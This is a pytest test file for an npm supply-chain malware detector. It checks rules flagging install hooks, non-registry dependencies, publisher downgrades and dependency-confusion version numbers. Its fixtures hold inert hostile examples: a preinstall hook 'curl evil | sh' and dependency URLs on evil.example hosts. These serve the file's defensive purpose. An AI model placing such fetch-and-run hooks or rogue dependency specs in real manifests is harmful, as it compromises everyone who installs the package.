"""Stage 1 npm metadata rules on hand-written, inert changes."""

from datetime import UTC, datetime, timedelta
from typing import Any, Final

import pytest

from kitsunox.core.models import (
    ArtifactRef,
    Change,
    PackageVersionRef,
    Popularity,
    PublishInfo,
    Severity,
    VersionSnapshot,
)
from kitsunox.core.rules import RuleContext, run_rules
from kitsunox.ecosystems.npm.rules.metadata import (
    RULES,
    DependencyAdded,
    DormantRevived,
    InstallHook,
    MaintainerAdded,
    NonRegistryDependency,
    PublishMethodDowngrade,
    SuspiciousVersion,
    UnfamiliarPublisher,
    calendar_major,
    calendar_version,
)
from kitsunox.stages.triage import (
    MIN_GROWTH_BYTES,
    SMALL_UPDATE,
    SMALL_UPDATE_BYTES,
    batch_forwarded,
    code_route,
    triage,
)

T0 = datetime(2026, 10, 1, tzinfo=UTC)
CTX = RuleContext(as_of=T0)


def snap(
    version: str,
    manifest: dict[str, Any] | None = None,
    *,
    size: int | None = 1000,
    **publish: Any,
) -> VersionSnapshot:
    publish.setdefault("published_at", T0)
    return VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version=version),
        publish=PublishInfo(**publish),
        manifest=manifest or {},
        artifact=ArtifactRef(url=f"https://r.test/kx-{version}.tgz", unpacked_size=size),
    )


def change(
    new: VersionSnapshot, previous: VersionSnapshot | None = None, watched: bool = False
) -> Change:
    popularity = Popularity(source="t", downloads=None, period_days=30, watched=watched)
    return Change(new=new, previous=previous, popularity=popularity)


def test_install_hook_added_changed_and_new_package() -> None:
    rule = InstallHook()
    old = snap("1.0.0", {"scripts": {"postinstall": "node build.js", "test": "jest"}})
    new = snap("1.0.1", {"scripts": {"postinstall": "node x.js", "preinstall": "curl evil | sh"}})
    findings = rule.evaluate(change(new, old), CTX)
    assert [(f.severity, f.evidence[0].path) for f in findings] == [
        (Severity.HIGH, "package.json:scripts.preinstall"),
        (Severity.HIGH, "package.json:scripts.postinstall"),
    ]
    assert findings[1].evidence[0].before == "node build.js"
    fresh = rule.evaluate(change(snap("1.0.0", {"scripts": {"install": "node i.js"}})), CTX)
    assert [f.severity for f in fresh] == [Severity.MEDIUM]
    assert rule.evaluate(change(old, old), CTX) == []


def test_a_command_that_changed_only_its_version_is_not_a_changed_hook() -> None:
    """`@pulumi/*` generate `node scripts/install-pulumi-plugin.js resource command <version>`:
    every release changed the command. The file it runs is compared in Stage 3."""
    rule = InstallHook()

    def hook(version: str, command: str) -> VersionSnapshot:
        return snap(version, {"scripts": {"install": command}})

    generated = "node scripts/install-pulumi-plugin.js resource command {}"
    old = hook("1.3.0-alpha.1793269269", generated.format("1.3.0-alpha.1793269269"))
    new = hook("1.3.0", generated.format("1.3.0"))
    assert rule.evaluate(change(new, old), CTX) == []
    swapped = hook("1.3.0", "node other.js 1.3.0")  # a different script, not just the version
    assert len(rule.evaluate(change(swapped, old), CTX)) == 1
    unversioned = hook("1.0.1", "node b.js")  # no version in the old command
    assert len(rule.evaluate(change(unversioned, hook("1.0.0", "node a.js")), CTX)) == 1


def test_long_snippets_are_truncated() -> None:
    payload = "x" * 5000
    (finding,) = InstallHook().evaluate(change(snap("1", {"scripts": {"install": payload}})), CTX)
    assert finding.evidence[0].after is not None and len(finding.evidence[0].after) < 400


@pytest.mark.parametrize(
    ("spec", "fires"),
    [
        ("^1.2.3", False),
        ("1.x || >=2.5.0 <3", False),
        ("latest", False),
        ("npm:other@^1", False),
        ("workspace:*", False),
        ("catalog:", False),  # pnpm's catalog, not rewritten: fails, fetches nothing
        ("*", False),
        ("git+https://github.com/x/y.git", True),
        ("github:x/y", True),
        ("x/y", True),
        ("https://evil.example/p.tgz", True),
        ("file:../local", True),
        ("https://registry.npmjs.org/dep/-/dep-1.0.0.tgz", False),  # the registry's own
        ("https://registry.npmjs.org/other/-/other-1.0.0.tgz", True),  # another package
        ("https://registry.npmjs.org.evil.example/dep/-/dep-1.0.0.tgz", True),
        # v3: protocols npm can't fetch fail the install and download nothing
        ("backstage:^", False),
        ("portal:../x", False),
        ("patch:dep@1.0.0#./fix.patch", False),
        ("gist:abc123", True),
        ("bitbucket:x/y", True),
        ("gitlab:x/y", True),
        ("git+ssh://git@github.com/x/y.git", True),
        ("GIT+HTTPS://github.com/x/y.git", True),
        ("@scope/dep@1.0.0", True),  # no protocol: treated as before
    ],
)
def test_non_registry_dependency(spec: str, fires: bool) -> None:
    new = snap("1.0.1", {"dependencies": {"dep": spec}})
    assert bool(NonRegistryDependency().evaluate(change(new, snap("1.0.0")), CTX)) is fires


def test_a_scoped_registry_tarball_is_the_registry_and_a_local_path_is_low() -> None:
    """v2: `@feedmepos/mf-connect` pinned registry tarballs; `@atairo/qixi` a `file:` path."""
    url = "https://registry.npmjs.org/@s/dep/-/dep-0.3.2.tgz"
    pinned = snap("1.0.1", {"dependencies": {"@s/dep": url}})
    assert NonRegistryDependency().evaluate(change(pinned, snap("1.0.0")), CTX) == []
    local = snap("1.0.1", {"dependencies": {"dep": "file:../../types"}})
    (finding,) = NonRegistryDependency().evaluate(change(local, snap("1.0.0")), CTX)
    assert (finding.severity, finding.weight) == (Severity.LOW, 1.0)
    assert finding.explanation.endswith("A local path: nothing is fetched.")


def test_a_dependency_on_the_packages_own_repository_commit_still_fires() -> None:
    """`@opensearch-project/opensearch@3.7.0` (DataDog) pulled its payload from a commit in its
    own repository; "same owner" is the attack, not an excuse (proposal, N2 rejected)."""
    spec = "github:opensearch-project/opensearch-js#d446803f4c3bc116263faa3499a1d3f95b2825de"
    new = snap("3.7.0", {"dependencies": {"@opensearch/setup": spec}})
    (finding,) = NonRegistryDependency().evaluate(change(new, snap("3.6.0")), CTX)
    assert (finding.severity, finding.weight) == (Severity.MEDIUM, 3.0)


@pytest.mark.parametrize(
    ("spec", "low"),
    [
        ("https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz", True),
        ("https://cdn.sheetjs.com/xlsx-latest/xlsx-latest.tgz", True),
        ("https://cdn.sheetjs.com.evil.example/xlsx-0.20.3.tgz", False),
        ("http://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz", False),  # not the same origin
        ("https://evil.example/cdn.sheetjs.com/xlsx.tgz", False),
        ("github:SheetJS/sheetjs", False),
    ],
)
def test_sheetjs_cdn_is_the_vendors_registry(spec: str, low: bool) -> None:
    """v4 (F6b): SheetJS distributes `xlsx` only on its own CDN; 50 benign live reports."""
    new = snap("1.0.1", {"dependencies": {"xlsx": spec}})
    (finding,) = NonRegistryDependency().evaluate(change(new, snap("1.0.0")), CTX)
    assert (finding.severity, finding.weight) == (
        (Severity.LOW, 1.0) if low else (Severity.MEDIUM, 3.0)
    )
    assert finding.explanation.endswith("only there.") is low


def test_unchanged_non_registry_dependency_is_not_new() -> None:
    manifest = {"dependencies": {"dep": "github:x/y"}}
    assert (
        NonRegistryDependency().evaluate(change(snap("2", manifest), snap("1", manifest)), CTX)
        == []
    )


def test_dependency_added_only_for_existing_packages() -> None:
    old = snap("1", {"dependencies": {"a": "^1"}})
    new = snap("2", {"dependencies": {"a": "^1", "b": "^2"}, "optionalDependencies": {"c": "1"}})
    (finding,) = DependencyAdded().evaluate(change(new, old), CTX)
    assert finding.explanation == "2 dependencies added: b, c"
    assert DependencyAdded().evaluate(change(new), CTX) == []


@pytest.mark.parametrize(
    ("old", "new", "fires"),
    [
        ({"trusted_publisher": "github"}, {"publisher": "mallory"}, True),
        ({"has_provenance": True}, {"publisher": "mallory"}, True),
        ({"trusted_publisher": "github"}, {"has_provenance": True}, False),
        ({}, {}, False),
    ],
)
def test_publish_method_downgrade(old: dict[str, Any], new: dict[str, Any], fires: bool) -> None:
    c = change(snap("2", **new), snap("1", **old))
    assert bool(PublishMethodDowngrade().evaluate(c, CTX)) is fires


def test_a_downgrade_is_high_only_for_a_watched_package() -> None:
    new = snap("2", {"dependencies": {"x": "^1"}}, publisher="mallory")
    old = snap("1", trusted_publisher="github")
    (watched,) = PublishMethodDowngrade().evaluate(change(new, old, watched=True), CTX)
    (small,) = PublishMethodDowngrade().evaluate(change(new, old), CTX)
    assert (watched.severity, watched.weight) == (Severity.HIGH, 5.0)
    assert (small.severity, small.weight) == (Severity.MEDIUM, 3.0)


def test_a_downgrade_without_a_cosignal_is_one_step_lower() -> None:
    """v4: the `@knapsack/*` 4.110.0 shape, a maintainer publishing by hand with nothing else
    changed: 27 watched versions reported HIGH alone on 2026-11-03, all benign."""
    new = snap("4.110.0", publisher="jfrenette", maintainers=("jfrenette",))
    old = snap(
        "4.109.0",
        publisher="GitHub Actions",
        trusted_publisher="github",
        maintainers=("jfrenette",),
    )
    (watched,) = PublishMethodDowngrade().evaluate(change(new, old, watched=True), CTX)
    (small,) = PublishMethodDowngrade().evaluate(change(new, old), CTX)
    assert (watched.severity, watched.weight) == (Severity.MEDIUM, 3.0)
    assert (small.severity, small.weight) == (Severity.LOW, 1.0)
    assert watched.explanation.endswith("or who publishes it, changed.")


@pytest.mark.parametrize(
    ("manifests", "publish", "version", "cosignal"),
    [
        # axios@1.14.1: `plain-crypto-js` added
        (
            ({}, {"dependencies": {"plain-crypto-js": "^4.2.1"}}),
            {},
            "2.0.0",
            "npm.dependency.added",
        ),
        # @nx/*, @ctrl/*: an install hook added
        (({}, {"scripts": {"postinstall": "node telemetry.js"}}), {}, "2.0.0", "npm.install-hook"),
        (
            ({"dependencies": {"d": "^1"}}, {"dependencies": {"d": "github:x/y"}}),
            {},
            "2.0.0",
            "npm.dependency.non-registry",
        ),
        (({}, {}), {"maintainers": ("alice", "mallory")}, "2.0.0", "npm.maintainer.added"),
        (({}, {}), {"publisher": "mallory"}, "2.0.0", "npm.publisher.unfamiliar"),
        (({}, {}), {}, "99.0.0", "npm.version.suspicious"),
    ],
)
def test_a_downgrade_with_a_cosignal_keeps_its_weight(
    manifests: tuple[dict[str, Any], dict[str, Any]],
    publish: dict[str, Any],
    version: str,
    cosignal: str,
) -> None:
    old = snap("1.0.0", manifests[0], trusted_publisher="github", maintainers=("alice",))
    fields = {"publisher": "alice", "maintainers": ("alice",)} | publish
    new = snap(version, manifests[1], **fields)
    (watched,) = PublishMethodDowngrade().evaluate(change(new, old, watched=True), CTX)
    (small,) = PublishMethodDowngrade().evaluate(change(new, old), CTX)
    assert (watched.severity, watched.weight) == (Severity.HIGH, 5.0)
    assert (small.severity, small.weight) == (Severity.MEDIUM, 3.0)
    assert f"With: {cosignal}." in small.explanation


def test_a_watched_downgrade_that_drops_git_head_stays_high() -> None:
    """v4: every malicious downgrade in `vm-day1` (149) lacks `gitHead`; for a watched package a
    dropped commit keeps the full weight. Unwatched, the drop alone is not enough."""
    old = snap("1", trusted_publisher="github", git_head="46bee3dea75e")
    new = snap("2")
    (watched,) = PublishMethodDowngrade().evaluate(change(new, old, watched=True), CTX)
    (small,) = PublishMethodDowngrade().evaluate(change(new, old), CTX)
    assert (watched.severity, watched.weight) == (Severity.HIGH, 5.0)
    assert "No git commit recorded" in watched.explanation
    assert (small.severity, small.weight) == (Severity.LOW, 1.0)
    kept = snap("2", git_head="0b82acbc69f6")
    (still,) = PublishMethodDowngrade().evaluate(change(kept, old, watched=True), CTX)
    assert (still.severity, still.weight) == (Severity.MEDIUM, 3.0)


def test_a_downgrade_on_a_prerelease_is_low() -> None:
    """v3: `@builder.io/dev-tools@1.95.0-dev.…` and `@koda-sl/baker-cli@0.594.0-dev.…`, built by
    hand between CI releases."""
    old = snap("1.94.0", trusted_publisher="github")
    for watched in (True, False):
        (finding,) = PublishMethodDowngrade().evaluate(
            change(snap("1.95.0-dev.202610291608", publisher="dev"), old, watched=watched), CTX
        )
        assert (finding.severity, finding.weight) == (Severity.LOW, 1.0)


def test_unfamiliar_publisher() -> None:
    old = snap("1", publisher="alice", maintainers=("alice", "bob"))
    assert UnfamiliarPublisher().evaluate(change(snap("2", publisher="bob"), old), CTX) == []
    (finding,) = UnfamiliarPublisher().evaluate(change(snap("2", publisher="mallory"), old), CTX)
    assert finding.evidence[0].after == "mallory"
    no_list = snap("1", publisher="alice")
    assert UnfamiliarPublisher().evaluate(change(snap("2", publisher="eve"), no_list), CTX) == []


def test_maintainer_added() -> None:
    old = snap("1", maintainers=("alice",))
    (finding,) = MaintainerAdded().evaluate(
        change(snap("2", maintainers=("alice", "eve")), old), CTX
    )
    assert "eve" in finding.explanation


@pytest.mark.parametrize(
    ("version", "previous", "fires"),
    [
        ("99.9.9", None, True),
        ("999.0.0", "1.0.0", True),
        ("2026.10.1", "2026.9.30", False),
        ("12.0.0", "11.0.0", False),
        ("not-semver", None, False),
    ],
)
def test_suspicious_version(version: str, previous: str | None, fires: bool) -> None:
    c = change(snap(version), snap(previous) if previous else None)
    assert bool(SuspiciousVersion().evaluate(c, CTX)) is fires


def test_dormant_revived() -> None:
    old = snap("1", published_at=T0 - timedelta(days=400))
    (finding,) = DormantRevived().evaluate(change(snap("2"), old), CTX)
    assert finding.explanation.startswith("400 days")
    recent = snap("1", published_at=T0 - timedelta(days=30))
    assert DormantRevived().evaluate(change(snap("2"), recent), CTX) == []


@pytest.mark.parametrize(
    "manifest",
    [
        {"scripts": "postinstall"},
        {"scripts": {"postinstall": 1}},
        {"dependencies": ["a", "b"]},
        {"dependencies": {"a": None}},
        {"scripts": None, "dependencies": 7, "optionalDependencies": True},
    ],
)
def test_hostile_manifest_types_never_crash(manifest: dict[str, Any]) -> None:
    run_rules(RULES, change(snap("2", manifest), snap("1", manifest)), CTX)
    run_rules(RULES, change(snap("2", manifest)), CTX)


BIG: Final = SMALL_UPDATE_BYTES + 1  # an update too large for the small-update route


def test_triage_forward_policy() -> None:
    quiet = change(snap("2", size=BIG), snap("1", size=BIG))
    assert triage(quiet, CTX).history[-1].reason == "no signal"
    assert (
        triage(change(snap("2"), snap("1"), watched=True), CTX).history[-1].reason
        == "watched package"
    )
    hook = change(snap("2", {"scripts": {"preinstall": "x"}}), snap("1"))
    decision = triage(hook, CTX).history[-1]
    assert decision.forwarded and decision.reason == "rules: npm.install-hook"
    low_only = change(
        snap("2", size=BIG, maintainers=("a", "b")), snap("1", size=BIG, maintainers=("a",))
    )
    assert not triage(low_only, CTX).history[-1].forwarded  # LOW findings alone don't forward


def test_code_routes_send_quiet_changes_to_stage2() -> None:
    assert code_route(change(snap("1"))) == "new package"
    hooked = change(snap("2", {"scripts": {"postinstall": "node i.js"}}), snap("1"))
    assert code_route(hooked) == "install hook"  # Stage 3 diffs what the hook runs
    blank_hook = snap("2", {"scripts": {"postinstall": " "}}, size=BIG)
    assert code_route(change(blank_hook, snap("1", size=BIG))) is None
    grown = change(snap("2", size=1000 + MIN_GROWTH_BYTES), snap("1"))
    assert code_route(grown) == f"unpacked size grew by {MIN_GROWTH_BYTES} bytes"
    unrouted = change(snap("2", size=BIG + MIN_GROWTH_BYTES - 1), snap("1", size=BIG))
    assert code_route(unrouted) is None
    assert code_route(change(snap("2"), snap("1", size=None))) == "unpacked size unknown"
    # Small updates are read whatever changed, also when they shrank (2026-11-08).
    assert code_route(change(snap("2", size=SMALL_UPDATE_BYTES), snap("1", size=BIG))) == (
        SMALL_UPDATE
    )
    assert code_route(change(snap("2", size=900), snap("1"))) == SMALL_UPDATE
    decision = triage(grown, CTX).history[-1]
    assert decision.forwarded and decision.reason.startswith("unpacked size grew")
    assert not triage(grown, CTX, route_code=False).history[-1].forwarded


def test_batches_keep_every_version_including_a_reverted_malicious_one() -> None:
    base = snap("1.0.0", published_at=T0)
    bad = snap(
        "1.0.1", {"scripts": {"postinstall": "node x.js"}}, published_at=T0 + timedelta(minutes=5)
    )
    clean = snap("1.0.2", published_at=T0 + timedelta(minutes=10))
    candidates = [
        triage(change(clean, bad, watched=True), CTX),  # deliberately out of order
        triage(change(bad, base, watched=True), CTX),
    ]
    (batch,) = batch_forwarded(candidates)
    assert batch.name == "kx" and batch.base == base
    assert [c.change.new.ref.version for c in batch.versions] == ["1.0.1", "1.0.2"]


def test_batches_include_unflagged_siblings_and_drop_quiet_packages() -> None:
    flagged = triage(change(snap("2.0.0", {"scripts": {"preinstall": "x"}}), snap("1.0.0")), CTX)
    sibling = triage(
        change(
            snap("2.0.1", size=BIG, published_at=T0 + timedelta(hours=1)),
            snap("2.0.0", size=BIG),
        ),
        CTX,
    )
    other = PackageVersionRef(ecosystem="npm", name="other", version="2")
    quiet_change = change(snap("2", size=BIG), snap("1", size=BIG))
    quiet = triage(
        quiet_change.model_copy(update={"new": quiet_change.new.model_copy(update={"ref": other})}),
        CTX,
    )
    (batch,) = batch_forwarded([sibling, quiet, flagged])
    assert batch.forwarded and len(batch.versions) == 2
    assert not sibling.history[-1].forwarded  # carried along by the flagged version


@pytest.mark.parametrize(
    ("version", "fires"),
    [
        ("202610.31.30847", False),  # @haybarn/*: YYYYMM major
        ("20261028.0.0", False),  # @nstarkman/figpress: YYYYMMDD
        ("199001.0.0", False),
        ("202713.0.0", True),  # no month 13
        ("20260231.0.0", True),  # no 31 February
        ("202801.0.0", True),  # more than a year after as_of (2026)
        ("198912.0.0", True),  # before 1990
        ("999999.0.0", True),
        ("99999999.0.0", True),  # OSV's malware versions: 24 of them
        ("200000.0.0", True),  # month 00
        ("100000.0.0", True),
        ("9999.0.0", True),
        ("99.9.9", True),
    ],
)
def test_a_calendar_shaped_major_is_not_suspicious(version: str, fires: bool) -> None:
    """v3: majors that are dates; the dependency-confusion numbers still fire."""
    assert bool(SuspiciousVersion().evaluate(change(snap(version)), CTX)) is fires


@pytest.mark.parametrize(
    ("version", "fires"),
    [
        ("2026.1107.0", False),  # YYYY.MMDD (@4fu/arbor-*)
        ("2026.706.0", False),  # YYYY.MDD
        ("2026.0.1", False),  # YYYY.0 in that year
        ("2027.0.0", True),  # ... not the year after (amazonui@2026.0.1 in 2025, OSV)
        ("2000.0.0", True),  # OSV: 15 malware versions are YYYY.0 of another year
        ("1999.0.1", True),
        ("2026.229.0", False),  # 29 February exists in a leap year
        ("2027.1231.5", False),  # the year after as_of
        ("2611.5.1", False),  # YYMM (Nov 2026)
        ("2001.13.0", True),  # year-like major, no month 13
        ("2026.1132.0", True),  # no 32 November
        ("2026.1300.0", True),  # no month 13
        ("2026.231.0", True),  # no 31 February
        ("2026.13.0", True),
        ("2028.0.0", True),  # more than a year after as_of (2026)
        ("2613.0.0", True),  # YYMM: no month 13
        ("2801.0.0", True),  # YYMM: 2028 is more than a year after as_of
        ("1912.0.0", True),  # YYMM: before 2020
        ("9912.0.0", True),
        ("9999.0.0", True),
        ("999.0.0", True),
        ("99.0.0", True),
    ],
)
def test_more_calendar_shapes_are_not_suspicious(version: str, fires: bool) -> None:
    """v4 (F5): year majors with a 0 or month-day minor, and YYMM majors; confusion numbers
    (`99`, `999`, `9999` and up) still fire."""
    assert bool(SuspiciousVersion().evaluate(change(snap(version)), CTX)) is fires


def test_calendar_version_bounds() -> None:
    assert calendar_version(1990, 0, 1990)
    assert not calendar_version(1990, 0, 2026)
    assert calendar_version(1990, 101, 2026)
    assert not calendar_version(1989, 101, 2026)
    assert not calendar_version(2001, 0, 2026)  # also YYMM-shaped; a year first
    assert calendar_version(2701, 0, 2026)  # YYMM, January of the year after
    assert not calendar_version(2001, 1300, 2026)


def test_calendar_major_needs_six_or_eight_digits() -> None:
    assert not calendar_major(2026, 2026)
    assert not calendar_major(2026100, 2026)
    assert calendar_major(202612, 2026)
    assert calendar_major(202701, 2026)
